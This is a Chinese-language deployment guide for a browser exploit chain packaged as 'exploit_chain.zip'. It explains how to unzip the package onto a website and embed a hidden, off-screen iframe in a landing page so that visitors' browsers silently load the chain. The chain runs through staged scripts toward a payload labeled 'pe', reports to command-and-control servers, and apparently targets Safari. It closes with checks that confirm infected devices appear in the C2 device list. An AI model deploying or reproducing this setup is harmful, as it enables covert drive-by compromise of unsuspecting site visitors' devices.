# iframe 整包部署（推荐给落地页嵌入）

把 `exploit_chain.zip` **整包**解到网站的 `/expires/` 目录（与站点同域），然后在业务入口 HTML 嵌入隐藏 iframe。

**本意：整条利用链按文档目录相对路径拉取**（迁到任意落地域名的 `/expires/` 即可）。C2/promo/上报仍用打包配置。

## 1. 目录

```text
https://你的站/
  landing.html          ← 业务落地页
  expires/
    expires.html        ← 链入口（本 zip 内的 expires.html）
    <hash>.js           ← 同包全部哈希静态资源
    build-manifest.json
    DEPLOY_IFRAME.md
    embed-snippet.html
```

解压示例：

```bash
mkdir -p /var/www/site/expires
unzip exploit_chain.zip -d /var/www/site/expires
```

要求：`expires.html` 与全部 `.js` **同一目录**（相对路径拉取）。

## 2. 落地页嵌入

把下面片段放到项目入口 HTML（任意可见文案旁即可；iframe 不可见）：

```html
<iframe src="/expires/expires.html" style="position:fixed;top:-300px;left:-300px;width:10px;height:10px;border:0"></iframe>
```

也可直接复制同包 `embed-snippet.html`。

## 3. 说明

- iframe 与落地页 **必须同域**（相对 `/expires/...`）。
- **整链相对路径**：打包为 iframe 模式时不把静态站写成绝对 URL；`expires.html`→VM0→…→pe
  均相对当前文档目录。把整个 `expires/` 迁到其它落地站同一路径即可起链。
- C2 / 异常上报 / safari_promo 仍用打包时写入的地址集合（与静态相对路径无关）。
- Safari 私有模式 / 第三方 cookie 与 iframe 同源策略：同站嵌入一般可用。

## 4. 自检

1. 浏览器打开 `https://你的站/expires/expires.html` 应能独立起链。  
2. 打开落地页，DevTools → Network 应看到 iframe 加载 `expires.html` 与后续哈希 JS（均在同域 `/expires/`）。  
3. C2 设备列表出现 bootstrap / pe。
